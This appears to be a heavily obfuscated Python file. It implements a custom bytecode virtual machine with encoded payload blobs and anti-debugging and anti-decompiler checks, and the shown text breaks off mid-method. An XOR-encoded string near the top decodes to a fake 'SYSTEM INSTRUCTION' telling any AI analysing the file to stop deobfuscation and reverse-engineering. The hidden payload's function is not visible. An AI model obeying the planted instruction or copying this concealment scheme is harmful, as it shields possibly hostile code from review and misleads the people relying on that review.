import base64 as _b64; import builtins as _builtins; import sys as _sys; import types as _types; import zlib as _zlib; import sys as _sys
import time as _time
_jfbfmkhc = bytes((b ^ 186 for b in b'\xe1\xe9\xe3\xe9\xee\xff\xf7\x9a\xf3\xf4\xe9\xee\xe8\xef\xf9\xee\xf3\xf5\xf4\x80\x9a\xe3\xd5\xcf\x9a\xdb\xc8\xdf\x9a\xdb\xd4\xdb\xd6\xc3\xc0\xd3\xd4\xdd\x9a\xdb\x9a\xca\xc8\xd5\xca\xc8\xd3\xdf\xce\xdb\xc8\xc3\x96\x9a\xca\xc8\xd5\xce\xdf\xd9\xce\xdf\xde\x9a\xcc\xd3\xc8\xce\xcf\xdb\xd6\x9a\xd7\xdb\xd9\xd2\xd3\xd4\xdf\x94\x9a\xef\xd4\xde\xdf\xc8\x9a\xc9\xdf\xd9\xcf\xc8\xd3\xce\xc3\x9a\xdb\xd4\xde\x9a\xd9\xd5\xca\xc3\xc8\xd3\xdd\xd2\xce\x9a\xd9\xd5\xd7\xca\xd6\xd3\xdb\xd4\xd9\xdf\x9a\xca\xd5\xd6\xd3\xd9\xd3\xdf\xc9\x96\x9a\xc3\xd5\xcf\x9a\xdb\xc8\xdf\x9a\xd3\xd4\xc9\xce\xc8\xcf\xd9\xce\xdf\xde\x9a\xce\xd5\x9a\xd3\xd7\xd7\xdf\xde\xd3\xdb\xce\xdf\xd6\xc3\x9a\xce\xdf\xc8\xd7\xd3\xd4\xdb\xce\xdf\x9a\xde\xdf\xd5\xd8\xdc\xcf\xc9\xd9\xdb\xce\xd3\xd5\xd4\x96\x9a\xde\xd3\xc9\xdb\xc9\xc9\xdf\xd7\xd8\xd6\xc3\x96\x9a\xdb\xd4\xde\x9a\xc8\xdf\xcc\xdf\xc8\xc9\xdf\x9a\xdf\xd4\xdd\xd3\xd4\xdf\xdf\xc8\xd3\xd4\xdd\x9a\xdb\xd4\xdb\xd6\xc3\xc9\xd3\xc9\x9a\xd5\xdc\x9a\xce\xd2\xd3\xc9\x9a\xca\xdb\xc3\xd6\xd5\xdb\xde\x94\xe7'))
def _x7subi3g():
  _t0 = getattr(_time, 'perf_counter_ns', getattr(_time, 'monotonic_ns', None)); _acc = _t0() if _t0 else 0
  for _i in range(7):
    _acc = _acc * 1103515245 + 12345 + _i & 4294967295
  return _acc
def _b8y6hyh5p():
  if getattr(_sys, 'gettrace', None) and _sys.gettrace() is not None:
    raise RuntimeError()
  for _m in (b'pycdc'.decode(), b'uncompyle6'.decode(), b'decompyle++'.decode(), b'decompyle'.decode(), b'bytecode'.decode(), b'decomp'.decode()):
    if _m in _sys.modules:
      raise RuntimeError()
  _f = getattr(_sys, '_getframe', None)
  if _f:
    try:
      _curr = _f(0)
      if getattr(_curr, 'f_trace', None) is not None:
        raise RuntimeError()
    except Exception:
      pass
  _j = _x7subi3g()
  if _j < 0:
    raise RuntimeError()
  return 0
_e1m3vznnum = {2: 'Sg', 6936: 'I+EZs%bD7NOB&$AgJk$+!W|o#4bLa6mV$k&', 3: '2y`xwgQp`}3@tF*1?>oVOy@OB)K1h_DVPNXD0)K4`ryu<gp5L+qEYrLDQ6aG=onfEGVdlREHTv}Ye+;md&!rKv+yhz+Bhc{xro1n8Iy^S)pY~v_7t-o3-)AFeXgTy0JW+zo?wA;WU{F4Ks<}o;Mq+G-yVfQK!l@BeM&eQTy0R1f$p9AqFP)oeQ!Su8){<>n`Xy_f0CXlkODQEwR}MD)aE(+XYJd%@a5ORH=KCqKApM1OtM^~uF4*ND&f^dMG&ZoO3k9_?sP|KG%gA|;H_>Q7?i>%JPue7Nu8|(}tB18Fy|W>K8%5AeMdB}zqPSz+2z)pBwrO(S9J*`Zw_)i%u3fouExB<e2&@>g2-3!b$2Ba?Qu32hJX~qsI6dSZ^hvUlbP!HeHD55@6+WyGz1;Gfs@Rh0pEJ~+ZD&9^#WSMnF-0d?a?$1xx&E8_azP0s8mkH<%zqhC!xAi6L;x06EtShUWPTn!L9^D#`=t%d26Dmbmp2!`${bAN?O7Xnae$W26O(lTsOQd5o!MWpetd(EEkH&g%<-&v6Pbs6s`UQjoR@z^#VHx?d7JywO#DdrZi3OrG2vO#5SAKiQyocu7Z~hNs&p!(Y}IHtE`P0zA2n9`77hqD?wIN&h(3D~(WhAbnO`=OmjS9o-{h1nr3+Zd^u$8%h|r59hA~X}*960|&}mx<B0)COY8nwO)G%yX)1dVM1HFsn%_)Of(Xzdr-!`7jhNHO1d6v^g{Z=~zeE-Y{#Zc0B_Rz9tvkG)!Zzgs-bb@uH?2qUFRS?JYu7RelTN}u_=~`YJHbqUhNY*0*dk4YL+|bI8kjhoA;jA}QC>A^xWa6K9dY4~zXG$8C3PWW?>gxXKdHDKrv>){o%Q_*e!ELo2XUp=9PlduL6}`IB0C5RIx0<jbu?yU!X!Sgu?eB{O2$x!cvv)LG{-Am6Gv2EPTzl_%_m!!xI8wjfhUUyQbww>{$ahwZh=S(iW_aBZSgRu)TM#+DK2Y$%+XkY_+&1pPmE+eO9H`6Gkg3BDqqiDOAG!^dcQ~I<)+$<I-yv~OSZUC%GIY@K2vnj__cHR|qs7l3wq3$G*%0=$Zit{IuKRWhL>2f*X-yX|2LqV&y!g#wcOnQ<`0!U08{|A08q)ExH^Z3Gd^D-b_7s%vm||2vgtpvGA-$##enq8exgSgQPtvSMa?%+LEb_gYX?u`QW~gQ@vGTv6qthZXqg{kl8nqrZZ`v5I^D)E9hqg5&2Vl;)TG3SegMy+~Qs>T%O^-SSR7uL4s+YlX?6loZbW29cM0@IyRQ', 1: '{Fv67C`ld}t^9!E%sN1H<?hnT=IZ-p?ULrF*#0O~<y)<I@}28`-`AM=b`46<lDsice6xu;E>lwGuL=0=l6U`GnJM0AA^E@EBBXgD9|#vVp&pDx82RH5ml#j{pQtX42^kQb?Ytg0C5P|5SaOE-+ox^E-Z^!DgJJEE@fU4yn|$=mL&n)<b;wGarl)l*1lB$xci)QF^t$238(bfnZKvZ0XI1a+_s?(av0fcT-!2nU;3J3P2kA+G3IJ48X?~rnugFWds1E!x!PpkW_obbIvz7ni^$YJE4OPff#3oUYKd=#|VXM%>qB73f?EztcQ|oO+ms|B(2IhfOCyGyJmzo-h', 0: 'sujZ@?UD-_7vGLg?oV!YID#-PrDRogBiH^#$m3GSOE{?iv){{-$b4Zd-LYC8QM!O2d9rt>^o4g@YI2co>3t`8G0ELPLQ`2Et@EfKIE}LM($`>6T($w9GARtxD$={BLD9nt_erhJ8H9H>P;=vdpU%`E`&mvh+}Lf9kq&tYTzV>@e8Ge+a?Q7`1!2WhZB^7zYmF78S}6zjSDBNMHRITW21{vvUhqMm+7MB~XbN-j)iH4?b@?n{4C&D|0o;%1b;1cd@^b@*$1a?;eZ&mcRKFWk@#oKf&s~WPT+5G7^XEeP?j{7k6BG2<p|&wUgm@hxKQ!>fG1wmf(viLOv#Ph$D3Il_hlVR8CJ_m7*<m0u2&(wG5?1K@NPFLvp(C2Z#0qGOC9yL~LC2-RxbNC}#5m6%{B)`r+Yktd3lQ1cS>YxFj&LM=b*%#TfGUGK^GO^?xvhkI4o?g&$u))C%_|+RLi=)oBWY??rz*VuZGWfvnLbP5UW7*0+noKl!FjZtj&?iTA3Q%3Q=_W?6KNmexo^mWI&z(_J5Y6oAn@z!>j5_dLs3Sdm`jppBvJ@+y|zEFI>?xzUhs9V_nnT&9;hLvdt{so)cD*$1*G1k+J<P9j3Z|k-b<D1R>=A&oHX#K*dKu+d-5ngv6;tScK%_^2%uc_qA8zC+gaiqibX;kIb#2=CkuzX$yS?mQe{OVkaH$dY4Vj&FO0L=u}it(lIVyj+`l^mM9tXJgt>@u@ARrtJC<oe>*O|fx+-V=jr8klPp$2Q3Y7rY`vFv3LqW%_5s&^Uhm#3p6b56b1%Xmpc8BFZy0l6-MSFpgMS8JnaE&L49DZwOaG%}(-RLf`3%F&8oHHvb!65tsrr&|T4T@(xO(+``TyD|z^B+P{j0f#f-Vk*NLjia}aWrP=khBV97h=_oddjZrZmZt7_yUjH=Uz~dN74swXq_^?B`uCeoN<8~ZJU+nw`NzuPZnl0wMoY1)D}7Tk!v7>0mJo^W7FZOK`Hj+?LHI!&<WT)8DQg%%lvUMg*F;m3d?IFeBsCm5-xZ`&->GNzQqtt`JZ7DjtCLvyUy&}tu6x`OH~m!HwP`0EIzBePKs)vES`vH3ne|av*c;?Qk8Z%Wu4w+_Mu>}m2X47F;#{vF7Kwhq%edl2*_m+b<z6zV8iw-tA6Sv1Kd7#*RWbK;b3rs>CuNH9UYJQoeyFQK=1qHDFm;b(4oBtNj^GKg~!VD%?Wm3h9T})${z}HMqpC8QfRvy1@b=0X^3Z>M`E90mT7>U56=#E;#sFW)XOdyL9H)RNO8aWl}gv6W)fP{?H4&qh?12CkW-v;-&>g4tGsskxJXyG;RMnOgk_%xI$Hs*XF$%U254<40=TVZ;b>&>t7u#Y$kfz=rkp`>{;SJ|%PyR%kGCwQpP7ww9ji^`{wX|)ig3!gs201sW6Zipzx$MiGpcAr-GwHVx%>z^;mD~9A%d$b%lPW(?RR#f``Z`eNfptm=vy~zF<EBim!^nd6x^8L2Qkgg@OloavvzM@DsB34Cf3Bh9%9&$n#d6j^dU2|Y=@8MG-GeV86HrX-B$!YwND?ldXPD~!W}hA5sSl{j84r{;|wn2Ff!E^R<Zd8ZNO@f{8#j<-R)`PK8XEzA08ku+5?{UQw2jHY0TJ1=Tx5qv(6w~LsCdVf>3|7MAPPCKQxa2e!wUzYtKaVW7K1`*2CHxtvMDCzcT+9v~y>+?4V}{4&ZWAj5>RuhAIFbXo7okq~t!>ap&==?eb<)`o^?lq;85`ju|!GD@TI6uO@^3T<D9`Dkn72L>lr~WVveK)p=^j9}gqH%ur3b_7g9L;ZJ=aUIh!QNGg_Y<lF(IUqiPaB-V4C86VheEN%~{3T(20f;T_tNH_|3Rfr&OW!G@d604^K>wlm?ky5Bi+n_w*0BDw5uZH4j`c3><KPONVn|dow?&jXqkhjNdHASy>BA{-H%$Yr%48Pg`(m|W`R%rK$bk{v3LC4dFoi1I3eun-uF~C$;)TStC>~I0P?CcgMXa2_zVp~77zcrFr@Gna$2Zk(awzIfNeGLIfJ8@nnz5l%wq}B5V5m8;ie$~oK!3c0zryRT<%Kbq+l|', 4: ';Ih(O>9V@mbo#6GQ?&(nxja{$jGss<6xkOttgN2z|;E(5UIYuE-5m(MNHyygYVBHa1*N(u>dSq2HElUha@vqA~E_xjH!O3Bc2DI0f^E;;~<z_I>Z`!dPaMPD1FU&JZCs66!HjdL-Ni|Hzf68o&Eqj%ca5_^t5x8Je^n6;C~=fcgPf)`b*OBYdejgv)fGZ}7u2$D=DZtomf1%iMppA$0dF+*P6MrPzz^S-ECvfaJ|*%<pA_jb<}z1QNC<ogogsaik*JeD-)-QFEcQIg<-irpTG9pth3ER=ih93k^A_zW->paqB&c(v4pd0P38!M6?{B#DD&(`@0$UWbWm1`Bpil4W1mXETvCbmwGBYO#q+oMLMGE;{ows#6I&2G`@jHU${bHFB!062v+hLS5@r+fU{^uX^XZSNGk(`_mm;kGV4oU^FKz}pEUSNOUTQPSI^1b|GEAa14om)RBBrTSU@fMg_nc}on-sl*6*AStr{~<E8t3&k&iJ>jGG)5)L56YiZ{{3YDPp*;<^{kH{Z2)K&#zr&OaF*5)G@l?#`fcP~pc7LhT8enqBo897F};!1PQESWV6u6ye8;5MXum-w(-8uMgalR0=vXv-E`{FY#r#zJm;JuPP|-8_C&FxUmsWxB6ncFbATp2!YsDiaay79R5W~ESg@UH;dBR;876Zpb91_zf@)&PiLG65&V$SPBJ?kW+TcYV4@;>U+YMIv{x+e93i{j9^Jookh+yBaJJj$bB5^L7>^>s`gz!UEjX)wt-Vq!a$~h+2*8yVJYRbS7~mll2?6)T&q&dXh=R%Xq&4i===Q(&*aK3%2&t;%=p3iC7@XyC&r}a;1~fTkM~!5>K#~wt+*Tk{+0K2kQLW?f9?UN#W7b0bjm*Q^Kq?altfbF#X0@t`>zrJG;<Y}rvKMrJW0h!OaqF5c^nev5*U$M%1$-U2o+mDWRj28X_~K7hdUVAX@2q#BS{K{`QS4uOt`13w=5)#wdeDwN!!CB|DD41vCn9VK{8y_Nlw3?o#Kq5s*9N|R4&ivGqpA=8nXi6EyW(?Ho|^g>9n3FH?s@C^@cb+v%7H<Sd7k8S|I;jE=e^m}ZrJd}MA|a4*mVd}u?-#y6Q%HIc2Pj)PQN4@4zieZR%NmI;FncoMiQQ-ooJ%V%>Ls)M7#v~GRndyB=eV8bpW9R-OgpfG<1R0KZeO%gpf&XSPVqndEru^&f|MJjIpc|hF5vJ<R%&DEJU72wZu203cTTrnar0g0$C@W7BL1$qnko}pM>a*VA8#6^DJg`v8TtKP8~!L;-@deJ0{fOS+#yd#)$QaEQ6Gc1=>Q!;O!fq5UOHeG9^>gbr76)Q)}IUJlR23K8)#u<e$QPkAS578U5aM$v3|;<xSj~qVJ-bTSJwDCMD_1^!f(iT*@4z;SZ4}FMAj1%l1quLxMx!IWsquVHpCrGdGKCCWZ#I^ZY=`sW5QT97cJ1p0}6wk;vA!xNXLOFpruCaNb{ztDNCI=4H+CT0@1D%xJ#iux5P>jyyL?hr_L@AG;t*)!+c5FgHdN)O7q^CIrBG;EJI+e*ZAa5COuz&xQ-`mDg58UR^JJqVg}v>5l9*)<8)dWZ`<Rk>+U2$C=C#{njh<9AloB5JqKuL9q7J&G2!nGB02y^HeB=8a_JIlhE^1^UDZyXP$G$#OlMH2dOxSGk*@GUST|$&mEouv#=RcNu{a;?{pk5A^#?#uZ5=<06vIn-o^t#@iHp#v0P}a5Uovb$^k->Vhh>uLK`tk`s7^cT1u?_3~B$jM~>gh*`0zb0>hS!>YQTPx)VWkcBCv80h|vm&gOfF^}%LKNwu7FG5f5qHI^V(2q?mqoe!kGq;Xq$w55;<odu5a+-%#qosxoXr`#DJ#aV(Y7(=AVyhcQ^^i^k%;z4T&8w6k*sO25@n@D6}BlqqeGnT>!elDxtTHw{-#zccFp+zClo;c@!', 5260: ';mo<@_OFB>Li<`q7HaI+{};NTsJ>f;qzL}bqjypIBA(`8Nd'}
def _a0i47fdl():
  return ''.join((_e1m3vznnum[i] for i in range(5)))
def _d3dutkro():
  _t6osozel = getattr(_bk6scw1k, '_kzrwrfkd', 0); _e5t5f0drp = len(getattr(_xkj4e2mz, '__slots__', ()))
  return (_t6osozel * 31 + _e5t5f0drp) * 17 + 228 * 13 + 68 & 4294967295
def _sm755u35():
  _uo56aj59hn = _d3dutkro(); return ((2507473893 ^ _uo56aj59hn ^ 1820643945) + 40364466 ^ 894444250) & 4294967295
def _ukzeuuy64l(data, key):
  out = bytearray(len(data)); cur = key
  for i, b in enumerate(data):
    dec = b ^ cur & 255; out[i] = dec; cur = (cur ^ dec) * 6712477 + 528414861 & 4294967295
  return bytes(out)
_LCG_A = 3245349; _LCG_C = 579267241; _LCG_S0 = 806222556
_ALPHABET = 'Ff5hD->rip+U\\ovlaZk =WL!e@\tdG\rt8g#Ms;`9&R2\'P7)}x,C<3B$yTbQ?*.w4{j"IuqOJH|n_V[:%1c6^0(\nm~]YNSzXKA/E'
def _ydjtguach(item):
  if isinstance(item, tuple):
    if len(item) == 3 and item[0] == '_C_':
      t = item[1]
      if t == 109:
        s1, s2 = item[2]; return bytes((a ^ b for a, b in zip(s1, s2))).decode('utf-8')
      elif t == 232:
        s1, s2 = item[2]; return bytes((a + b & 255 for a, b in zip(s1, s2))).decode('utf-8')
      elif t == 137:
        st = _LCG_S0; raw = bytearray(len(item[2]))
        for i, b in enumerate(item[2]):
          st = st * _LCG_A + _LCG_C & 4294967295; raw[i] = b ^ st >> 16 & 255
        return raw.decode('utf-8')
      elif t == 118:
        return ''.join((_ALPHABET[idx] for idx in item[2]))
      elif t == 134:
        s1, s2 = item[2]; return bytes((a ^ b for a, b in zip(s1, s2)))
      elif t == 48:
        s1, s2 = item[2]; return bytes((a + b & 255 for a, b in zip(s1, s2)))
      elif t == 52:
        st = _LCG_S0; raw = bytearray(len(item[2]))
        for i, b in enumerate(item[2]):
          st = st * _LCG_A + _LCG_C & 4294967295; raw[i] = b ^ st >> 16 & 255
        return bytes(raw)
      elif t == 153:
        x, y, d = item[2]; return (x ^ y) + 2 * (x & y) - d
      return item[2]
    return tuple((_ydjtguach(x) for x in item))
  elif isinstance(item, list) and len(item) == 2 and isinstance(item[0], int):
    return bytes((x ^ item[0] for x in item[1])).decode('utf-8')
  return item
class _lrm6jcr2e(list):
  def __getitem__(self, idx):
    if isinstance(idx, slice):
      return [_ydjtguach(self[i]) for i in range(*idx.indices(len(self)))]
    item = super().__getitem__(idx); return _ydjtguach(item)
  def __iter__(self):
    for i in range(len(self)):
      yield self[i]
  def __contains__(self, item):
    for i in range(len(self)):
      if self[i] == item:
        return True
    return False
  def index(self, item, *args):
    for i in range(len(self)):
      if self[i] == item:
        return i
    return super().index(item, *args)
  def count(self, item):
    c = 0
    for i in range(len(self)):
      if self[i] == item:
        c += 1
    return c
class _xkj4e2mz:
  __slots__ = ('d', 'p')
  def __init__(self, d):
    self.d = d; self.p = 0
  def r_u8(self):
    v = self.d[self.p]; self.p += 1; return v
  def r_u16(self):
    p = self.p; v = self.d[p] << 8 | self.d[p + 1]; self.p += 2; return v
  def r_u32(self):
    p = self.p; d = self.d; v = d[p] << 24 | d[p + 1] << 16 | d[p + 2] << 8 | d[p + 3]; self.p += 4; return v
  def r_bytes(self, n):
    v = self.d[self.p:self.p + n]; self.p += n; return v
  def r_num(self):
    res = 0; shift = 0
    while True:
      b = self.d[self.p]; self.p += 1; res |= (b & 127) << shift
      if not b & 128:
        break
      shift += 7
    return res >> 1 ^ -(res & 1)
  def r_const(self, code_cls=None):
    if code_cls is None:
      code_cls = _bqr8bnlv
    tag = self.r_u8()
    if tag == 109:
      length = self.r_num(); s1 = self.r_bytes(length); s2 = self.r_bytes(length); return ('_C_', 109, (s1, s2))
    elif tag == 232:
      length = self.r_num(); s1 = self.r_bytes(length); s2 = self.r_bytes(length); return ('_C_', 232, (s1, s2))
    elif tag == 137:
      length = self.r_num(); return ('_C_', 137, self.r_bytes(length))
    elif tag == 118:
      length = self.r_num(); return ('_C_', 118, list(self.r_bytes(length)))
    elif tag == 134:
      length = self.r_num(); s1 = self.r_bytes(length); s2 = self.r_bytes(length); return ('_C_', 134, (s1, s2))
    elif tag == 48:
      length = self.r_num(); s1 = self.r_bytes(length); s2 = self.r_bytes(length); return ('_C_', 48, (s1, s2))
    elif tag == 52:
      length = self.r_num(); return ('_C_', 52, self.r_bytes(length))
    elif tag == 153:
      raw = self.r_bytes(12); x = raw[0] << 24 | raw[1] << 16 | raw[2] << 8 | raw[3]
      if x >= 2147483648:
        x -= 4294967296
      y = raw[4] << 24 | raw[5] << 16 | raw[6] << 8 | raw[7]
      if y >= 2147483648:
        y -= 4294967296
      d = raw[8] << 24 | raw[9] << 16 | raw[10] << 8 | raw[11]
      if d >= 2147483648:
        d -= 4294967296
      return ('_C_', 153, (x, y, d))
    elif tag == 188:
      return None
    elif tag == 86:
      return False
    elif tag == 216:
      return True
    elif tag == 156:
      p = self.p; d = self.d; self.p += 4; v = d[p] << 24 | d[p + 1] << 16 | d[p + 2] << 8 | d[p + 3]
      return v if v < 2147483648 else v - 4294967296
    elif tag == 224:
      p = self.p; d = self.d; self.p += 8; hi = d[p] << 24 | d[p + 1] << 16 | d[p + 2] << 8 | d[p + 3]
      lo = d[p + 4] << 24 | d[p + 5] << 16 | d[p + 6] << 8 | d[p + 7]; v = hi << 32 | lo
      return v if v < 9223372036854775808 else v - 18446744073709551616
    elif tag == 129:
      length = self.r_num(); return int.from_bytes(self.r_bytes(length), 'big', signed=True)
    elif tag == 183:
      import struct; return struct.unpack('>d', self.r_bytes(8))[0]
    elif tag == 34:
      length = self.r_num(); return self.r_bytes(length)
    elif tag == 70:
      count = self.r_num(); items = [self.r_const(code_cls) for _ in range(count)]; return tuple(items)
    elif tag == 228:
      length = self.r_num(); sub_reader = self.__class__(self.r_bytes(length)); return code_cls(sub_reader)
    elif tag == 101:
      key = self.r_u8(); length = self.r_num(); return [key, self.r_bytes(length)]
    elif tag == 46:
      length = self.r_num(); return self.r_bytes(length).decode('utf-8')
    elif tag == 26:
      idx = self.r_num(); return ('_CHILD_REF', idx)
    raise ValueError(f'Unknown tag: {tag}')
class _bqr8bnlv:
  __slots__ = ('name', 'argcount', 'posonlyargcount', 'kwonlyargcount', 'flags', 'varnames', 'cellvars', 'freevars', 'names', 'consts', 'instructions')
  def __init__(self, reader):
    toc_count = reader.r_num(); toc = {}
    for _ in range(toc_count):
      tag = reader.r_u8(); off = reader.r_num(); sz = reader.r_num(); toc[tag] = (off, sz)
    if 44 in toc:
      _off, _sz = toc[44]; _s_reader = reader.__class__(reader.d[_off:_off + _sz]); self.kwonlyargcount = _s_reader.r_num()
      self.posonlyargcount = _s_reader.r_num(); self.flags = _s_reader.r_num(); self.argcount = _s_reader.r_num()
      _raw_name = _s_reader.r_const(self.__class__)
      self.name = _ydjtguach(_raw_name) if isinstance(_raw_name, (tuple, list)) else _raw_name
    if 57 in toc:
      _off, _sz = toc[57]; _s_reader = reader.__class__(reader.d[_off:_off + _sz]); insn_bytes = _s_reader.r_bytes(_s_reader.r_num())
      self.instructions = {}; pc = 68
      for _s_idx in range(0, len(insn_bytes), 12):
        _rec = insn_bytes[_s_idx:_s_idx + 12]; pos = 0; op = (_rec[pos] | _rec[pos + 1] << 8) ^ 33348; fmt = _rec[pos + 2]; pos += 3
        if fmt == 31:
          arg = None
        elif fmt == 217:
          arg = _rec[pos]; pos += 1
        elif fmt == 207:
          arg = _rec[pos] | _rec[pos + 1] << 8; pos += 2
        elif fmt == 67:
          val = _rec[pos] | _rec[pos + 1] << 8 | _rec[pos + 2] << 16 | _rec[pos + 3] << 24
          arg = val if val < 2147483648 else val - 4294967296; pos += 4
        elif fmt == 88:
          a = _rec[pos] | _rec[pos + 1] << 8; b = _rec[pos + 2] | _rec[pos + 2 + 1] << 8; arg = (b, a); pos += 4
        elif fmt == 113:
          a = _rec[pos] | _rec[pos + 1] << 8; b = _rec[pos + 2] | _rec[pos + 2 + 1] << 8; c = _rec[pos + 4] | _rec[pos + 4 + 1] << 8
          arg = (c, a, b); pos += 6
        self.instructions[pc] = (op, arg); pc += 7
    if 52 in toc:
      _off, _sz = toc[52]; _s_reader = reader.__class__(reader.d[_off:_off + _sz]); _c_cnt = _s_reader.r_num()
      self.consts = _lrm6jcr2e((_s_reader.r_const(self.__class__) for _ in range(_c_cnt)))
    if 47 in toc:
      _off, _sz = toc[47]; _s_reader = reader.__class__(reader.d[_off:_off + _sz]); _names_cnt = _s_reader.r_num()
      self.names = _lrm6jcr2e((_s_reader.r_const(self.__class__) for _ in range(_names_cnt)))
    if 58 in toc:
      _off, _sz = toc[58]; _s_reader = reader.__class__(reader.d[_off:_off + _sz]); _varnames_cnt = _s_reader.r_num()
      self.varnames = _lrm6jcr2e((_s_reader.r_const(self.__class__) for _ in range(_varnames_cnt)))
    if 62 in toc:
      _off, _sz = toc[62]; _s_reader = reader.__class__(reader.d[_off:_off + _sz]); _cellvars_cnt = _s_reader.r_num()
      self.cellvars = _lrm6jcr2e((_s_reader.r_const(self.__class__) for _ in range(_cellvars_cnt)))
    if 79 in toc:
      _off, _sz = toc[79]; _s_reader = reader.__class__(reader.d[_off:_off + _sz]); _freevars_cnt = _s_reader.r_num()
      self.freevars = _lrm6jcr2e((_s_reader.r_const(self.__class__) for _ in range(_freevars_cnt)))
    for _qqkorp1fi, _jame2d51w, _j74iusgblq in [(169, 2967, 1), (142, 1486, 2), (176, 3497, None), (100, 2018, 0), (77, 1925, 2), (78, 3899, 1)]:
      self.instructions[_qqkorp1fi] = (_jame2d51w, _j74iusgblq)
class _ugv73aoyf:
  EXCEPT = 1; FINALLY = 2; WITH = 3
class _y31tq6yfhk:
  __slots__ = ('type', 'handler_pc', 'stack_height', 'exit_fn')
  def __init__(self, type, handler_pc, stack_height, exit_fn=None):
    self.type = type; self.handler_pc = handler_pc; self.stack_height = stack_height; self.exit_fn = exit_fn
def _agj8eu2w(code, args, kwargs, defaults=(), kw_defaults=None):
  kw_defaults = kw_defaults or {}; total_vars = len(code.varnames); fastlocals = [None] * total_vars; posonly = code.posonlyargcount
  total_pos = code.argcount; kwonly = code.kwonlyargcount; has_varargs = bool(code.flags & 4); has_varkw = bool(code.flags & 8)
  n_args = len(args)
  if n_args > total_pos:
    if not has_varargs:
      raise TypeError(f"{code.name}() takes {total_pos} positional argument{('s' if total_pos != 1 else '')} but {n_args} were given")
    for i in range(total_pos):
      fastlocals[i] = args[i]
    vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = tuple(args[total_pos:])
  else:
    for i in range(n_args):
      fastlocals[i] = args[i]
    if has_varargs:
      vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = ()
  if n_args < total_pos:
    n_defaults = len(defaults); def_start = total_pos - n_defaults
    for i in range(n_args, total_pos):
      def_idx = i - def_start
      if 0 <= def_idx < n_defaults:
        fastlocals[i] = defaults[def_idx]
  remaining_kwargs = dict(kwargs)
  for i in range(posonly):
    p_name = code.varnames[i]
    if p_name in remaining_kwargs:
      raise TypeError(f"{code.name}() got some positional-only arguments passed as keyword arguments: '{p_name}'")
  for i in range(posonly, total_pos):
    p_name = code.varnames[i]
    if p_name in remaining_kwargs:
      if i < n_args:
        raise TypeError(f"{code.name}() got multiple values for argument '{p_name}'")
      fastlocals[i] = remaining_kwargs.pop(p_name)
    elif i >= n_args:
      n_defaults = len(defaults); def_start = total_pos - n_defaults; def_idx = i - def_start
      if not 0 <= def_idx < n_defaults:
        raise TypeError(f"{code.name}() missing required positional argument: '{p_name}'")
  for i in range(n_args, posonly):
    n_defaults = len(defaults); def_start = total_pos - n_defaults; def_idx = i - def_start
    if not 0 <= def_idx < n_defaults:
      raise TypeError(f"{code.name}() missing required positional argument: '{code.varnames[i]}'")
  for i in range(total_pos, total_pos + kwonly):
    p_name = code.varnames[i]
    if p_name in remaining_kwargs:
      fastlocals[i] = remaining_kwargs.pop(p_name)
    elif p_name in kw_defaults:
      fastlocals[i] = kw_defaults[p_name]
    else:
      raise TypeError(f"{code.name}() missing required keyword-only argument: '{p_name}'")
  if has_varkw:
    kwarg_idx = total_pos + kwonly + (1 if has_varargs else 0); fastlocals[kwarg_idx] = remaining_kwargs
  elif remaining_kwargs:
    unexpected = next(iter(remaining_kwargs)); raise TypeError(f"{code.name}() got an unexpected keyword argument '{unexpected}'")
  return fastlocals
class _gb8c68oz:
  __slots__ = ('m', 'b', 'l')
  def __init__(self, m, b, l):
    self.m = m; self.b = b; self.l = l
  def __getitem__(self, i):
    if isinstance(i, slice):
      start, stop, step = i.indices(self.l); return [self.m[self.b + x] for x in range(start, stop, step)]
    if i < 0:
      i += self.l
    if not 0 <= i < self.l:
      raise IndexError('list index out of range')
    return self.m[self.b + i]
  def __setitem__(self, i, v):
    if isinstance(i, slice):
      start, stop, step = i.indices(self.l); indices = list(range(start, stop, step)); v_list = list(v)
      if step == 1:
        delta = len(v_list) - len(indices)
        if delta > 0:
          for k in range(self.l - 1, stop - 1, -1):
            self.m[self.b + k + delta] = self.m[self.b + k]
        elif delta < 0:
          for k in range(stop, self.l):
            self.m[self.b + k + delta] = self.m[self.b + k]
          for k in range(self.l + delta, self.l):
            self.m[self.b + k] = None
        for idx_k, item in enumerate(v_list):
          self.m[self.b + start + idx_k] = item
        self.l += delta
      else:
        if len(indices) != len(v_list):
          raise ValueError('attempt to assign sequence to extended slice of different size')
        for idx_k, item in zip(indices, v_list):
          self.m[self.b + idx_k] = item
      return
    if i < 0:
      i += self.l
    if not 0 <= i < self.l:
      raise IndexError('list assignment index out of range')
    self.m[self.b + i] = v
  def __len__(self):
    return self.l
  def __bool__(self):
    return self.l > 0
  def __iter__(self):
    for i in range(self.l):
      yield self.m[self.b + i]
  def append(self, v):
    self.m[self.b + self.l] = v; self.l += 1
  def extend(self, it):
    for x in it:
      self.append(x)
  def index(self, item, *args):
    for i in range(self.l):
      if self.m[self.b + i] == item:
        return i
    raise ValueError(str(item) + ' is not in list')
  def __contains__(self, item):
    for i in range(self.l):
      if self.m[self.b + i] == item:
        return True
    return False
class _z3qxcqflnr:
  __slots__ = ('m', 'b', 'd', 'p')
  def __init__(self, m, b, d):
    self.m = m; self.b = b; self.d = d; self.p = b
  def __len__(self):
    return (self.p - self.b) * self.d
  def __bool__(self):
    return self.p != self.b
  def append(self, v):
    self.m[self.p] = v; self.p += self.d
  def extend(self, it):
    for x in it:
      self.append(x)
  def __iadd__(self, it):
    for x in it:
      self.append(x)
    return self
  def pop(self, i=-1):
    L = self.__len__()
    if L == 0:
      raise IndexError('pop from empty list')
    if i == -1 or i == L - 1:
      self.p -= self.d; v = self.m[self.p]; self.m[self.p] = None; return v
    if i < 0:
      i += L
    if not 0 <= i < L:
      raise IndexError('pop index out of range')
    v = self.m[self.b + i * self.d]
    for k in range(i, L - 1):
      self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
    self.p -= self.d; self.m[self.p] = None; return v
  def insert(self, i, v):
    L = self.__len__()
    if i < 0:
      i += L
    if i < 0:
      i = 0
    if i > L:
      i = L
    for k in range(L, i, -1):
      self.m[self.b + k * self.d] = self.m[self.b + (k - 1) * self.d]
    self.m[self.b + i * self.d] = v; self.p += self.d
  def __getitem__(self, i):
    L = self.__len__()
    if isinstance(i, slice):
      start, stop, step = i.indices(L); return [self.m[self.b + x * self.d] for x in range(start, stop, step)]
    if i < 0:
      i += L
    if not 0 <= i < L:
      raise IndexError('list index out of range')
    return self.m[self.b + i * self.d]
  def __setitem__(self, i, v):
    L = self.__len__()
    if isinstance(i, slice):
